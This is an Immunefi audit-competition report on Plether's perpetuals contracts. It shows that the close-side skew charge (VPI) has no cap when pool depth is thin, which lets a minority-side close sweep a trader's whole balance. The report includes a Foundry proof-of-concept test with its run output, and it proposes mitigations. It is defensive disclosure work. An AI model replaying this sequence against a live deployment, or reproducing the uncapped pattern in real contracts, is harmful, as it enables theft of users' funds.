# \#99752 [SC-High] Close VPI divides by economic depth with no cap, so a minority-side close in a thin pool is charged several times its notional and the trader's whole account is swept into the pool

**Submitted on Nov 15th 2026 at 05:28:43 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99752
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

Plether charges a skew price (VPI) from the potential `C(S) = k*S^2 / (2D)`, where `D` is the economic pool depth (`totalAssets - traderClaims`). For opens the cost per unit is bounded, because the 40% skew cap (`S <= 0.4*D`) holds the marginal VPI at `k * maxSkewRatio` (40 bp at release params). Closes have no such cap. The only guard on a close is `D != 0`. So when depth gets small but stays nonzero, for example after the pool pays out large legit trader profits, a close that increases skew (a minority-side close) is charged a VPI that grows like `1/D` with no upper bound.

The close planner then collects that charge from everything the account has: withheld gain, spendable action reserve, the **entire free settlement balance**, released margin and committed order margin. Only the remainder is waived. In the PoC a 19,000 USDG notional LONG close is charged **51,317 USDG** of VPI, and the trader's balance goes from **60,004 USDG to 0**. That is **50,996 USDG** beyond price loss and fee, and it all goes to LPs.

The same close with `D == 0` exactly is charged no fresh VPI and costs only 9,016 USDG. The charge therefore depends on a cliff at zero, not on risk.

### Plain Summary

- Gabbar's pool has just paid two big winners (Raju on the way down, Basanti on the way up). The pool is almost empty: 175 USDG of economic depth is left. No claims are outstanding and nobody did anything wrong.
- Veeru holds a small LONG (19k notional at the current price) on the minority side. He also keeps 48k USDG of idle collateral in the clearinghouse, which is normal for UI users.
- Veeru closes. His close moves skew from 38k to 57k. The curve divides by D = 175, so VPI = 0.01 × (57,000² − 38,000²) / (2 × 175.87) = **51,317 USDG**, which is 2.7 USDG of charge per 1 USDG of notional closed.
- The planner takes all of Veeru's reachable money: 60,004 USDG goes to 0. Gabbar's LPs get it.
- If the pool had been at exactly 0 depth, Veeru would have paid only his price loss and fee (9,016 USDG). At 175 USDG of depth he pays ~51k more.

### Vulnerability Details

**1. Close VPI is evaluated on the raw curve with live depth. The only guard is `depth != 0`.**

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:104-111
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
@> if (inputs.poolDepthAssets != 0) {
@>     state.vpiDeltaAssets = CfdMath.calculateVPI(
@>         inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
@>     );
   }
```

```solidity
// packages/perps/src/CfdMath.sol:134-138
@> uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;   // grows like 1/D, no ceiling
   ...
@> uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
```

The depth fed in is gross assets minus trader claims:

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:1339-1341
poolDepthAssets: PositionRiskAccountingLib.computeNetPoolDepthAssets(
    snap.poolAssets, snap.totalTraderClaimBalanceAssets
),
```

**2. The skew cap, which bounds VPI per unit for opens, is applied to opens only.**

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:473-479 (planOpen only)
uint256 maxSkewAssets = Math.mulDiv(netDepthAssets, snap.riskParams.maxSkewRatio, CfdMath.WAD);
@> if (
@>     inputs.postSkewAssets > maxSkewAssets
@>         && (inputs.postSkewAssets >= inputs.preSkewAssets || orderSideIsPostOpenHeavy)
   ) {
       delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH;
       return;
   }
```

No equivalent check exists on the close path, and the cap is not re-checked when `D` later falls. So `S / D` on a close is unbounded once depth shrinks, and so is the VPI per unit of notional (`≈ k * S / D`).

**3. A full close collects the charge from the whole account. Nothing bounds it by the position's own value.**

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:1093-1133 (_planCloseCashSources)
@> uint256 collectibleFreeSettlementAssets = snap.accountBuckets.freeSettlementAssets + releasedVpiReserveAssets;
   if (terminal) {
       collectibleFreeSettlementAssets += delta.liquidationReserveReleaseAssets;
   }
@> uint256 freeConsumedAssets = actionChargeAfterReserveAssets < collectibleFreeSettlementAssets
       ? actionChargeAfterReserveAssets
       : collectibleFreeSettlementAssets;
   ...                                       // then released margin, then committed order margin (terminal)
@> delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

**4. The trader cannot step out in pieces.** A partial close whose charge is not fully collectible reverts:

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:882-884
@> if (remainingSize > 0 && delta.actionChargeWaivedAssets > 0) {
       delta.revertCode = CfdEnginePlanTypes.CloseRevertCode.PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE;
       return delta;
   }
```

**5. Cliff at zero.** At `D == 0` the fresh delta is skipped entirely (point 1). At `D = 175 USDG` the same close is charged 51,317 USDG. The protocol prices the same exit at either nothing or more than the position is worth, depending on a few hundred dollars of pool cash.

**How the thin-depth state is reached (PoC, legit actions only).** Book at price 1.00: C SHORT 30k, V LONG 10k (12k margin, 60k USDG deposited), A LONG 100k vs B SHORT 91.2k. All opens are built in chunks under the 40% skew cap. Price falls to 0.60 and A closes; the pool pays A's profit in cash. Price rises to 1.90 and B closes; the pool pays B's profit in cash. Pool assets fall to 175.87 USDG, degraded mode latches, and claims = 0. Only Pyth price updates are mocked. Every action goes through public `OrderRouter` entry points with release risk params (vpiFactor 0.01, maxSkewRatio 0.4, MM 0.1%, IM 0.2%, fee 4 bp). Deferred trader claims reduce `D` one-for-one in the same way, so a claim-heavy pool reaches the same region.

### Impact Details

| Quantity (PoC, actually run) | Value |
|---|---|
| Economic depth `D` | 175.867098 USDG |
| V close notional | 19,000 USDG |
| V position margin | 11,990 USDG |
| V realized price loss | 9,000 USDG |
| Close VPI assessed | **51,317.16 USDG** (2.7× notional) |
| Marginal envelope opens get (`k × maxSkewRatio × notional`) | 76 USDG (charge is ~675×) |
| V balance before → after | 60,003.996102 → **0** |
| Loss beyond price loss + execution fee | **50,996.40 USDG** |
| Pool assets gained | 59,996.40 USDG |
| Control: same book, `D == 0` | V loss 9,015.80 USDG (price loss + fee only) |

- **Funds lost:** trader collateral that was never pledged to the position (V's ~48k USDG of free settlement) is moved to LP NAV. The amount taken is limited only by the victim's total reachable collateral, so any minority-side trader who closes in this window can lose the whole account.
- **No risk is transferred for it.** The position is closed and the pool's liability goes down, yet the pool receives several times the notional.
- **Broken invariants:** (a) a close never takes more than the position's own value (margin + PnL) plus bounded costs; (b) VPI per unit of notional stays in the envelope the skew cap gives opens (`k × maxSkewRatio`); (c) the zero-depth carve-out ("protective exits stay live without a fresh charge") is meant to keep exits cheap when the pool is drained, but at near-zero depth exits become maximally expensive.
- **Who is hit:** any trader on the minority side with free collateral. TP/SL protection-triggered closes go through the same close planner (`planClose`), so a protection close in this window would get the same charge without the user acting. I did not test this path separately.
- **Who benefits:** LPs holding or depositing into the pool at that moment.
- **Avoidability:** a user who first withdraws all free collateral and then closes limits the loss to position collateral (the rest is waived). Nothing in the UI, docs or previews warns about this, and protection-triggered closes cannot do it.

### Why this is not a known issue

- **Scan S-30, "Temporary pool liquidity can reduce a skew-increasing close charge"** (`audits/scan-plether-fi-plether-core-d4541b49.md:1693`, info). It uses the same depth input, but it describes the *closer* inflating `D` to pay *less*. It does not say the positive close charge has no upper bound, that it can exceed the position's value, or that it jumps between `D = 0` and `D > 0`. The harm here falls on an honest closer, not on LPs.
- **Scan S-31, "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"** (`:1742`). This is the opposite direction (rebate) and is bounded by the lifetime clamp. It is not this.
- **Scan S-4, "Deferred trader claims inflate open skew capacity and reduce VPI"** (`:206`). This is about opens only.
- **`packages/perps/SECURITY.md:1438-1440`** (Known Limitations, VPI). It documents that VPI depends on live assets net of claims and that zero depth creates no fresh close VPI. It does not document that near-zero depth creates close charges above the position's value. The zero-depth carve-out shows the intent is to keep exits cheap in a drained pool, and the near-zero case breaks that intent.
- **`packages/perps/SECURITY.md:1305-1306`** lists free settlement as a source for action obligations on a full close. This report does not claim that this collection order is wrong on its own. The bug is that the obligation itself is unbounded. Collection from free settlement is what turns the unbounded charge into a full-account loss.
- **Cecuro AI report** (no VPI-depth finding; LOW-48 is only about the receipt depth label), **SC Audit Studio pre-audit** (SC-M3 is about open IMR projection of vpiAccrued), **Cantina** and the **collaborative report** (spot package, no VPI): none cover this.

### Mitigation

- **Bound close VPI.** Either (i) floor the depth used for a skew-increasing close at `D_eff = max(D, S_post / maxSkewRatio)`, which keeps the marginal close VPI in the same `k × maxSkewRatio` envelope opens get; or (ii) cap a positive close VPI at what the position itself can cover (released pledge + withheld price gain), and never collect it from free settlement.
- **Remove the cliff.** Use the floored depth from (i) instead of special-casing `D == 0`, so cost changes continuously as depth falls.
- Check after the change that the lifetime rebate clamp still blocks round-trip extraction, because a floored depth changes the potential's telescoping when depth moves.

### References

- `packages/perps/src/libraries/CloseAccountingLib.sol:104-111`: close VPI, only `depth != 0` guard
- `packages/perps/src/CfdMath.sol:134-138`: `k * S^2 / (2D)`, unbounded in `1/D`
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1339-1341`: close depth = assets − claims
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:473-479`: skew cap on opens only
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1093-1133`: full-close charge collection (free settlement at :1111, :1116)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:882-884`: partial close with uncollectible charge reverts
- `packages/perps/SECURITY.md:1438-1440`: zero-depth carve-out (documented)
- `packages/perps/WHITEPAPER.md:830-848`: VPI potential and skew limit for new exposure

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/ce-vpi-low-depth-blowup.t.sol` and run:

```
forge test --root packages/perps --match-path test/ce-vpi-low-depth-blowup.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Close VPI uses C(S)=k*S^2/(2D) with no cap and only D==0 skipped. After LEGIT trader payouts leave
///         economic depth D small but nonzero, a skew-increasing (minority-side) full close is assessed a VPI charge
///         far larger than the position, and the close planner collects it from the trader's unrelated free
///         settlement balance. Release params: vpiFactor 0.01e18, maxSkewRatio 0.4e18, MM 0.1%, IM 0.2%, fee 4bp.
contract VpiLowDepthBlowupPoC is BasePerpTest {
    address internal constant A = address(0xA11CE); // LONG, wins on the first leg
    address internal constant B = address(0xB0B); // SHORT, wins on the second leg
    address internal constant C = address(0xCA201); // remaining majority SHORT
    address internal constant V = address(0x71C7); // victim: minority LONG with idle free collateral
    address internal constant LP = address(0x1B0001);

    uint256 internal currentPrice;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 80_000e6;
    }

    function setUp() public override {
        super.setUp();
        assertEq(engine.executionFeeBps(), 4);
        currentPrice = 1e8;
        _refresh(1e8);
        _fundTrader(A, 60_000e6);
        _fundTrader(B, 60_000e6);
        _fundTrader(C, 60_000e6);
        _fundTrader(V, 60_000e6);
        _fundJunior(LP, 40_000e6);
        _refresh(1e8);
    }

    // ---------------------------------------------------------------- helpers (public entry points only)
    function _live(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        if (previous >= vm.getBlockTimestamp()) previous = vm.getBlockTimestamp() - 1;
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refresh(uint256 price) internal {
        _mockPythUpdateData(price);
        bytes[] memory d = _live(price);
        router.updateMarkPrice(d);
        currentPrice = price;
    }

    function _executeHead() internal {
        uint64 head = router.nextExecuteId();
        bytes[] memory data = _mockPythUpdateData(currentPrice);
        router.executeOrder(head, data);
    }

    function _open(address a, CfdTypes.Side side, uint256 size, uint256 margin) internal {
        vm.prank(a);
        router.commitOrder(side, size, margin, 0, false);
        _executeHead();
    }

    function _closeAll(address a) internal {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(a);
        vm.prank(a);
        router.commitOrder(side, size, 0, 0, true);
        _executeHead();
        (uint256 after_,,,,,,) = engine.positions(a);
        assertEq(after_, 0, "close executed");
    }

    function _netDepth() internal view returns (uint256) {
        uint256 ta = pool.totalAssets();
        uint256 t = engine.totalTraderClaimBalanceAssets();
        return ta > t ? ta - t : 0;
    }

    /// @dev Book: C SHORT 30k, V LONG 10k (12k margin), A LONG 100k vs B SHORT `bShort` (both legs built in chunks
    ///      to respect the 40% opening skew cap). Market swings 1.00 -> 0.60 (A closes in profit) -> 1.90 (B closes in
    ///      profit). Both payouts are paid in cash by the pool, leaving a thin pool in degraded mode.
    function _buildThinPool(uint256 bShortChunk, bool expectNoClaims) internal {
        _open(C, CfdTypes.Side.SHORT, 15_000e18, 3_000e6);
        _open(V, CfdTypes.Side.LONG, 10_000e18, 12_000e6);
        _open(C, CfdTypes.Side.SHORT, 15_000e18, 3_000e6);
        for (uint256 k; k < 4; ++k) {
            _open(A, CfdTypes.Side.LONG, 25_000e18, 5_000e6);
            _open(B, CfdTypes.Side.SHORT, bShortChunk, bShortChunk / 1e12 / 5);
        }
        _refresh(0.6e8);
        _closeAll(A);
        _refresh(1.9e8);
        _closeAll(B);
        if (expectNoClaims) {
            assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claims: depth reduced only by paid trader profits");
        }
    }

    // ---------------------------------------------------------------- PoC
    function test_thinDepthCloseVpiSweepsFreeCollateral() public {
        _buildThinPool(22_800e18, true); // B SHORT 91.2k
        uint256 depth = _netDepth();
        (uint256 vSize, uint256 vMargin,,,,,) = engine.positions(V);
        uint256 notional = vSize * currentPrice / 1e20;
        ICfdEngineTypes.ClosePreview memory pv = engineLens.previewClose(V, vSize, currentPrice);
        uint256 vBefore = clearinghouse.balanceAssets(V);
        uint256 poolBefore = pool.totalAssets();

        console2.log("degraded mode            ", engine.degradedMode() ? 1 : 0);
        console2.log("economic depth D (USDG6) ", depth);
        console2.log("V close notional (USDG6) ", notional);
        console2.log("V position margin        ", vMargin);
        console2.log("V total balance before   ", vBefore);
        console2.log("previewed realized PnL   ");
        console2.logInt(pv.realizedPnlAssets);
        console2.log("previewed close VPI      ");
        console2.logInt(pv.vpiDeltaAssets);
        console2.log("40bp open-cap envelope   ", notional * 40 / 10_000);

        _closeAll(V);

        uint256 vAfter = clearinghouse.balanceAssets(V);
        uint256 loss = vBefore - vAfter;
        uint256 priceLoss = uint256(-pv.realizedPnlAssets);
        console2.log("V total balance after    ", vAfter);
        console2.log("V realized loss          ", loss);
        console2.log("loss beyond price loss+fee", loss - priceLoss - pv.executionFeeAssets);
        console2.log("pool assets gained       ", pool.totalAssets() - poolBefore);

        // VPI charge for a 19k-notional close is > 2.6x the notional (675x the 40bp envelope the skew cap gives opens)
        assertGt(uint256(pv.vpiDeltaAssets), notional * 2);
        // the victim's ENTIRE account (incl. ~48k USDG idle free collateral never pledged to the position) is taken
        assertEq(vAfter, 0, "victim balance swept to zero");
        assertGt(loss - priceLoss - pv.executionFeeAssets, 50_000e6);
    }

    /// @dev Control: same book with B SHORT 91.6k -> B's payout exceeds free pool cash and is deferred as a trader
    ///      claim, so economic depth = assets - claims is exactly 0. The planner then skips
    ///      fresh VPI (CloseAccountingLib.sol:106) and the same victim close costs only price loss + fee.
    function test_zeroDepthSameCloseCostsOnlyPriceLoss() public {
        _buildThinPool(22_900e18, false); // B SHORT 91.6k
        assertEq(_netDepth(), 0);
        uint256 vBefore = clearinghouse.balanceAssets(V);
        _closeAll(V);
        uint256 loss = vBefore - clearinghouse.balanceAssets(V);
        console2.log("depth 0 -> V realized loss", loss);
        assertLt(loss, 9_100e6);
    }
}
```

## Result:

Actually run: `forge test --root packages/perps --match-path test/ce-vpi-low-depth-blowup.t.sol -vv`

```
Ran 2 tests for test/ce-vpi-low-depth-blowup.t.sol:VpiLowDepthBlowupPoC
[PASS] test_thinDepthCloseVpiSweepsFreeCollateral() (gas: 26293168)
Logs:
  degraded mode             1
  economic depth D (USDG6)  175867098
  V close notional (USDG6)  19000000000
  V position margin         11990000000
  V total balance before    60003996102
  previewed realized PnL
  -9000000000
  previewed close VPI
  51317159961
  40bp open-cap envelope    76000000
  V total balance after     0
  V realized loss           60003996102
  loss beyond price loss+fee 50996396102
  pool assets gained        59996396102

[PASS] test_zeroDepthSameCloseCostsOnlyPriceLoss() (gas: 26166276)
Logs:
  depth 0 -> V realized loss 9015796102

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 53.05ms (83.02ms CPU time)
```

